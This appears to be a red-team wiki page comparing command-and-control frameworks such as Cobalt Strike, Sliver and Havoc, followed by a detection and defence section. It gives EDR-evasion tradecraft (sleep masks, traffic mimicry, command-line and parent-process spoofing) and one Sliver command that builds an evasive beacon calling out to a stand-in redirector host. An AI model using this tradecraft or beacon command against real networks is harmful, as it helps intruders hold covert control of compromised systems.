---
title: C2 frameworks
slug: c2-frameworks
---

> **TL;DR:** Cobalt Strike, Sliver, Mythic, Havoc, Brute Ratel — pick on OPSEC posture, transport flexibility, BOF/extension ecosystem, and your defenders' familiarity with each.

## What it is
A command-and-control framework is the server + implant + operator UI used to drive post-exploitation. Frameworks differ in implant language (C, Rust, .NET, Go), default transports (HTTP/S, DNS, SMB, TCP, custom), modular extension model (BOFs, reflective DLLs, scripts), and how aggressive their default profiles are. Tradecraft is largely framework-agnostic, but each ships its own detection footprint.

## Preconditions / where it applies
- Initial access already achieved or a payload-delivery path lined up
- Infrastructure to host the team server + redirectors
- A profile / config tuned for the engagement's traffic model

## Technique
Capability comparison from a 2024-era operator viewpoint:

- **Cobalt Strike** — the reference. Mature Malleable C2 profiles, BOFs, the Aggressor scripting language, broad redirector recipes. Default beacon is heavily signatured; success depends entirely on profile quality and post-ex BOF discipline. Watch for the default JA3, named-pipe pattern, and stager YARA hits.
- **Sliver** — open-source, written in Go. Multi-protocol implant (mTLS, HTTP, DNS, WireGuard), nice cross-platform story, armory of community modules. Default JARM and HTTP profile are public-known; tune `--mtls`, custom canaries, traffic-encoder plugins.
- **Mythic** — Docker-orchestrated, agent-agnostic. Pick from Apollo (.NET), Athena (.NET multi-OS), Poseidon (Go), Apfell (JS for macOS). Best for teams running multiple agents in parallel and for research because adding a new C2 profile is plugin work, not core hacking.
- **Havoc** — modern open-source, C/C++ implant ("Demon") with sleep obfuscation (Ekko), indirect syscalls, return address spoofing built in. Active community; profiles still maturing.
- **Brute Ratel** — commercial, sold to vetted operators. Strong out-of-box OPSEC posture (badger implant, scriptable C2), saw a heavy abuse-leak phase, very well known to defenders.

Universal tradecraft regardless of framework:
- Tune sleep + jitter (e.g. 60s sleep / 30% jitter for interactive, 6h+ for long-haul)
- Use sleep mask (Ekko, Foliage, AceLdr) so beacon heap encrypts during sleep
- Run an HTTP profile that matches a real product (Slack, Office365, telemetry endpoint) end-to-end — URI, headers, body encoding, status codes
- Stage zero through a reputable redirector + CDN-edge; never let the team server's IP touch the target

```
# Sliver example: generate a mTLS beacon
sliver > generate beacon --mtls c2.redirector.example:443 --os windows --arch amd64 --evasion --skip-symbols --save ./out
```

Process-context tradecraft is just as important as protocol choice. Cobalt Strike's `argue` command spoofs a process command line in PEB memory before `run`, so an EDR that logs `CreateProcess` events sees the cover argument while the real argument string still drives the child — useful for hiding LOLBin flags from command-line telemetry. Pair this with `spawnu <ppid> <listener>` to give the spawned beacon a parent that fits the host's normal process tree (services.exe, explorer.exe under the right session) rather than the loud orphaned `rundll32` parented to your initial-access process.

## Detection and defence
- JARM/JA3 fingerprinting on the TLS handshake — default framework certs and cipher orders are catalogued
- Beacon analysis: periodic + jittered POSTs of consistent size are easy to flag
- Named-pipe naming, default sleep mask signatures, and known BOF hash sets
- Memory scanning (Moneta, PE-sieve, HollowsHunter) for unbacked executable memory
- Defenders should baseline outbound JA3, alert on TLS to newly-registered domains, and run frequent memory snapshots on high-value hosts

## References
- [Cobalt Strike Malleable C2 docs](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm) — profile language reference
- [Sliver wiki](https://sliver.sh/docs) — feature matrix and transports
- [Mythic docs](https://docs.mythic-c2.net/) — agent and C2 profile model
- [Havoc framework](https://github.com/HavocFramework/Havoc) — code and demon features
- [ired.team — Cobalt Strike 101](https://www.ired.team/offensive-security/red-team-infrastructure/cobalt-strike-101-installation-and-interesting-commands) — beacon commands including argue, spawnu, psinject, browserpivot
- [[c2-protocol-design]] [[infrastructure-design]]
